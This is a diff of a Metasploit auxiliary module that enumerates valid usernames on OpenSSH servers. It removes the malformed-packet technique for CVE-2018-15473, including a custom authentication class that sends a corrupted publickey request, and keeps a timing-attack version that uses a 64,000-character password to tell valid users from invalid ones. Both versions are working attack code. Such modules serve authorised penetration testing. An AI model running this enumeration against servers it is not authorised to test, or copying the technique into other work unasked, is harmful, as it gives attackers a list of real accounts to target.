@@ -13,66 +13,33 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'SSH Username Enumeration',
-      'Description'    => %q{
-        This module uses a malformed packet or timing attack to enumerate users on
-        an OpenSSH server.
-
-        The default action sends a malformed (corrupted) SSH_MSG_USERAUTH_REQUEST
-        packet using public key authentication (must be enabled) to enumerate users.
-
+      'Name'        => 'SSH Username Enumeration',
+      'Description' => %q{
+        This module uses a time-based attack to enumerate users on an OpenSSH server.
         On some versions of OpenSSH under some configurations, OpenSSH will return a
-        "permission denied" error for an invalid user faster than for a valid user,
-        creating an opportunity for a timing attack to enumerate users.
-
-        Testing note: invalid users were logged, while valid users were not. YMMV.
+        "permission denied" error for an invalid user faster than for a valid user.
       },
-      'Author'         => [
-        'kenkeiras',     # Timing attack
-        'Dariusz Tytko', # Malformed packet
-        'Michal Sajdak', # Malformed packet
-        'Qualys',        # Malformed packet
-        'wvu'            # Malformed packet
-      ],
-      'References'     => [
-        ['CVE', '2003-0190'],
-        ['CVE', '2006-5229'],
-        ['CVE', '2016-6210'],
-        ['CVE', '2018-15473'],
-        ['OSVDB', '32721'],
-        ['BID', '20418'],
-        ['URL', 'http://seclists.org/oss-sec/2018/q3/124'],
-        ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']
-      ],
-      'License'        => MSF_LICENSE,
-      'Actions'        => [
-        ['Malformed Packet',
-         'Description' => 'Use a malformed packet',
-         'Type'        => :malformed_packet
-        ],
-        ['Timing Attack',
-         'Description' => 'Use a timing attack',
-         'Type'        => :timing_attack
-        ]
-      ],
-      'DefaultAction'  => 'Malformed Packet'
+      'Author'      => ['kenkeiras'],
+      'References'  =>
+       [
+         ['CVE',   '2006-5229'],
+         ['OSVDB', '32721'],
+         ['BID',   '20418']
+       ],
+      'License'     => MSF_LICENSE
     ))
 
     register_options(
       [
         Opt::Proxies,
         Opt::RPORT(22),
-        OptString.new('USERNAME',
-                      [false, 'Single username to test (username spray)']),
         OptPath.new('USER_FILE',
-                    [false, 'File containing usernames, one per line']),
+                    [true, 'File containing usernames, one per line', nil]),
         OptInt.new('THRESHOLD',
                    [true,
                    'Amount of seconds needed before a user is considered ' \
-                   'found (timing attack only)', 10]),
-        OptBool.new('CHECK_FALSE',
-                    [false, 'Check for false positives (random username)', false])
-      ]
+                   'found', 10])
+      ], self.class
     )
 
     register_advanced_options(
@@ -104,66 +71,48 @@ class MetasploitModule < Msf::Auxiliary
 
   # Returns true if a nonsense username appears active.
   def check_false_positive(ip)
-    user = Rex::Text.rand_text_alphanumeric(8..32)
-    attempt_user(user, ip) == :success
+    user = Rex::Text.rand_text_alphanumeric(8)
+    result = attempt_user(user, ip)
+    return(result == :success)
   end
 
   def check_user(ip, user, port)
-    technique = action['Type']
-
-    opts = {
-      :port            => port,
-      :use_agent       => false,
-      :config          => false,
-      :proxy           => ssh_socket_factory,
-      :non_interactive => true,
-      :verify_host_key => :never
+    pass = Rex::Text.rand_text_alphanumeric(64_000)
+    factory = ssh_socket_factory
+    opt_hash = {
+      :auth_methods  => ['password', 'keyboard-interactive'],
+      :port          => port,
+      :use_agent     => false,
+      :password      => pass,
+      :config        => false,
+      :proxy         => factory,
+      :non_interactive => true
     }
 
-    # The auth method is converted into a class name for instantiation,
-    # so malformed-packet here becomes MalformedPacket defined below
-    case technique
-    when :malformed_packet
-      opts.merge!(:auth_methods => ['malformed-packet'])
-    when :timing_attack
-      opts.merge!(
-        :auth_methods => ['password', 'keyboard-interactive'],
-        :password     => rand_pass
-      )
-    end
-
-    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
 
     start_time = Time.new
 
     begin
-      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
-        Net::SSH.start(ip, user, opts)
+      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        Net::SSH.start(ip, user, opt_hash)
       end
     rescue Rex::ConnectionError
       return :connection_error
-    rescue Timeout::Error
-      return :success if technique == :timing_attack
-    rescue Net::SSH::AuthenticationFailed
-      return :fail if technique == :malformed_packet
-    rescue Net::SSH::Exception => e
-      vprint_error("#{e.class}: #{e.message}")
+    rescue Net::SSH::Disconnect, ::EOFError
+      return :success
+    rescue ::Timeout::Error
+      return :success
+    rescue Net::SSH::Exception
     end
 
     finish_time = Time.new
 
-    case technique
-    when :malformed_packet
-      return :success if ssh
-    when :timing_attack
-      return :success if (finish_time - start_time > threshold)
+    if finish_time - start_time > threshold
+      :success
+    else
+      :fail
     end
-
-    :fail
-  end
-
-  def rand_pass
-    Rex::Text.rand_text_english(64_000..65_000)
   end
 
   def do_report(ip, user, port)
@@ -196,15 +145,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def user_list
-    users = []
-
-    if datastore['USERNAME']
-      users << datastore['USERNAME']
-    elsif datastore['USER_FILE'] && File.readable?(datastore['USER_FILE'])
-      users += File.read(datastore['USER_FILE']).split
+    if File.readable? datastore['USER_FILE']
+      File.new(datastore['USER_FILE']).read.split
+    else
+      raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
     end
-
-    users
   end
 
   def attempt_user(user, ip)
@@ -237,70 +182,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-    print_status("#{peer(ip)} Using #{action.name.downcase} technique")
-
-    if datastore['CHECK_FALSE']
-      print_status("#{peer(ip)} Checking for false positives")
-      if check_false_positive(ip)
-        print_error("#{peer(ip)} throws false positive results. Aborting.")
-        return
-      end
-    end
-
-    users = user_list
-
-    if users.empty?
-      print_error('Please populate USERNAME or USER_FILE')
+    print_status "#{peer(ip)} Checking for false positives"
+    if check_false_positive(ip)
+      print_error "#{peer(ip)} throws false positive results. Aborting."
       return
+    else
+      print_status "#{peer(ip)} Starting scan"
+      user_list.each{ |user| show_result(attempt_user(user, ip), user, ip) }
     end
-
-    print_status("#{peer(ip)} Starting scan")
-    users.each { |user| show_result(attempt_user(user, ip), user, ip) }
-  end
-end
-
-#
-# Define malformed-packet auth method for Net::SSH.start
-#
-# XXX: This is ghetto af (see lib/msf/core/exploit/fortinet.rb)
-#
-# https://tools.ietf.org/rfc/rfc4252.txt
-# https://tools.ietf.org/rfc/rfc4253.txt
-#
-class Net::SSH::Authentication::Methods::MalformedPacket < Net::SSH::Authentication::Methods::Abstract
-  def authenticate(service_name, username, password = nil)
-    debug { 'Sending SSH_MSG_USERAUTH_REQUEST (publickey)' }
-
-    # Corrupt everything after auth method
-    send_message(userauth_request(
-=begin
-      string    user name in ISO-10646 UTF-8 encoding [RFC3629]
-      string    service name in US-ASCII
-      string    "publickey"
-      boolean   FALSE
-      string    public key algorithm name
-      string    public key blob
-=end
-      username,
-      service_name,
-      'publickey',
-      Rex::Text.rand_text_english(8..42)
-    ))
-
-    # SSH_MSG_DISCONNECT is queued
-    begin
-      message = session.next_message
-    rescue Net::SSH::Disconnect
-      debug { 'Received SSH_MSG_DISCONNECT' }
-      return true
-    end
-
-    if message && message.type == USERAUTH_FAILURE
-      debug { 'Received SSH_MSG_USERAUTH_FAILURE' }
-      return false
-    end
-
-    # We'll probably never hit this
-    false
   end
 end
